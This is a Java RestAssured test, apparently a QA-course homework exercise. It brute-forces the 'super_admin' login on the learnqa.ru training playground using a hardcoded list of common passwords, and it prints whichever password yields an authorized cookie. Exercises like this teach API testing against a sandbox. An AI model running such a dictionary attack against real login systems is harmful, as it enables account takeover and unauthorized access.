import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Password {
    @Test
    public void testRestAssured() {
        String super_admin = "super_admin";
        String[] password = {"password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567", "monkey", "111111", "letmein",	"1234", "1234567890",  "dragon",	"baseball", "sunshine",	"iloveyou", "trustno1",	"princess", "dadobe123[a]", "123123", "welcome",	"login",	"admin",	"abc123", "qwerty123", "solo", "1q2w3e4r", "master",	"666666", "photoshop[a]",	"1qaz2wsx", "qwertyuiop", "ashley",	"mustang",	"121212",	"starwars",	"654321", "bailey",	"access",	"flower",	"555555", "passw0rd", "shadow",	"lovely", "7777777", "michael",	"!@#$%^&*", "jesus",	"superman",	"hello",	"charlie",	"888888",  "696969",	"hottie",	"freedom",	"aa123456", "qazwsx",	"ninja",	"azerty",	"loveme",	"whatever",	"donald", "batman",	"zaq1zaq1",	"password1", "Football",	"000000",	"123qwe"};


        for (int i = 0; i < password.length; i++) {
            Map<String, Object> data = new HashMap<>();
            data.put("login", super_admin);
            data.put("password", password[i]);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .put("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", cookie);

            Response response2 = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .put("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();


            String method = response2.print();


            if (method.equals("You are authorized"))
            {  System.out.println(password[i]);
                System.out.println(method);
                break;}

        }

    }

}
